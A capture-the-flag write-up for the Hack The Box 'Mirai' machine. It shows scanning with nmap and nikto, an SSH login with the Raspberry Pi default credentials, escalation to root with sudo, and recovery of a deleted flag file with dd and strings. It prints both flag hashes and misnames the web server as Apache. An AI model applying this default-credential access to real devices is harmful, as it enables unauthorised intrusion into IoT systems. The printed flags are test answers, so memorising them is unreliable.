# MIRAI WRITEUP
###### IP-Addres: 10.10.10.48
###### Operation-System: Linux
[Mirai](https://www.hackthebox.eu/home/machines/profile/64)

## RECONNAISSANCE
**NMAP Scan:**
```nmap -sS -sV 10.10.10.48

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-15 07:28 EDT
Nmap scan report for 10.10.10.48
Host is up (0.023s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp   open  domain  dnsmasq 2.76
80/tcp   open  http    lighttpd 1.4.35
2010/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.12 seconds
```
We see, there is a Apache and a SSH server running.
We also know, Mirai was a botnet that spread by only checking IOT-Devices for default login.
So we go on the Webserver first and see: NOTHING. But why shouldn't we run nikto on it just to see if it got something juicy?
Lets see.
**NIKTO SNIPPET**

```
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
```

After we go to the admin/index.php page, we see its a raspberry pi. After googling few minutes, the default login credentials for a raspberry pi are:
*pi:raspberry*
Let's go to SSH and login.
```ssh pi@10.10.10.48
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ 
``` 

We got in. Show me what you got.

```pi@raspberrypi:~ $ ls -a
.              .config          .thumbnails           Public
..             .dbus            .xsession-errors      Templates
.Xauthority    .gstreamer-0.10  .xsession-errors.old  Videos
.asoundrc      .gtkrc-2.0       Desktop               background.jpg
.bash_history  .local           Documents             oldconffiles
.bash_logout   .pki             Downloads             python_games
.bashrc        .profile         Music
.cache         .themes          Pictures
pi@raspberrypi:~ $ cd Desktop
pi@raspberrypi:~/Desktop $ ls
Plex  user.txt
pi@raspberrypi:~/Desktop $ cat user.txt
ff837707441b257a20e32199d7c8838d
```
Voilá. we got in. 

**Time for rootz**

We know that the default pi user has root privs, so we can just "sudo -i" into the root shell

```
root@raspberrypi:~# cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```

Time to check the mountz

```
root@raspberrypi:/media/usbstick# ls -la
total 18
drwxr-xr-x 3 root root  1024 Aug 14 05:27 .
drwxr-xr-x 3 root root  4096 Aug 14 05:11 ..
-rw-r--r-- 1 root root   129 Aug 14 05:19 damnit.txt
drwx------ 2 root root 12288 Aug 14 05:15 lost+found

root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Looks like James is no James Bond. 

![Alt test](https://media.giphy.com/media/hKNPxrffFH0GY/giphy.gif "Suuure")

Well, Time to use the good old [Double D's](http://www.forensicswiki.org/wiki/Dd)

We first check the device the usb is mounted on

```
root@raspberrypi:/tmp/Rekt# df
Filesystem     1K-blocks    Used Available Use% Mounted on
aufs             8856504 2830048   5553524  34% /
tmpfs             102408    4948     97460   5% /run
/dev/sda1        1354528 1354528         0 100% /lib/live/mount/persistence/sda1
/dev/loop0       1267456 1267456         0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs             256020       0    256020   0% /lib/live/mount/overlay
/dev/sda2        8856504 2830048   5553524  34% /lib/live/mount/persistence/sda2
devtmpfs           10240       0     10240   0% /dev
tmpfs             256020       8    256012   1% /dev/shm
tmpfs               5120       4      5116   1% /run/lock
tmpfs             256020       0    256020   0% /sys/fs/cgroup
tmpfs             256020      60    255960   1% /tmp
/dev/sdb            8887      93      8078   2% /media/usbstick
tmpfs              51204       0     51204   0% /run/user/999
tmpfs              51204       0     51204   0% /run/user/1000
```

Target: /dev/sdb

```
root@raspberrypi:/tmp/Rekt# dd if=/dev/sdb | strings > James-you-fool.txt 
20480+0 records in
20480+0 records out
10485760 bytes (10 MB) copied, 0.284623 s, 36.8 MB/s

root@raspberrypi:/tmp/Rekt# cat James-you-fool.txt 
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```
A small hurdle but easy to overcome :wink:

![Alt test](https://media.giphy.com/media/vL3mgyhQWkggw/giphy.gif "Recovery")

And we got **rootz**

root.txt : 3d3e483143ff12ec505d026fa13e020b



